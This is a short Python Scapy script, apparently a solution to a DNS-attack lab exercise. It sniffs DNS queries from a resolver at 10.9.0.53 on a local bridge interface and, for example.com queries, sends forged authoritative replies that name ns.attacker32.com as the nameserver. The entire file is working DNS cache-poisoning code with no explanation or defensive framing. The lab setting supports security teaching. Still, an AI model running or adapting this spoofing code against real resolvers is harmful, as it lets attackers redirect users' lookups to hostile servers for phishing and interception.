#!/usr/bin/env python3
from scapy.all import *
import sys
NS_NAME = "example.com"
def spoof_dns(pkt):
    if (DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode('utf-8')):
        print(pkt.sprintf("{DNS: %IP.src%--> %IP.dst%: %DNS.id%}"))

        ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)   # Create an IP object
        udp = UDP(dport=pkt[UDP].sport, sport=53) # Create a UDP object
        NSsec =  DNSRR(rrname='example.com', type='NS', rdata='ns.attacker32.com')
        dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1,ns=NSsec) # Create a DNS object
        spoofpkt = ip/udp/dns # Assemble the spoofed DNS packet
        send(spoofpkt)

myFilter = "udp and (src host 10.9.0.53 and dst port 53)" # Set the filter
pkt=sniff(iface='br-9157d2486514', filter=myFilter, prn=spoof_dns)

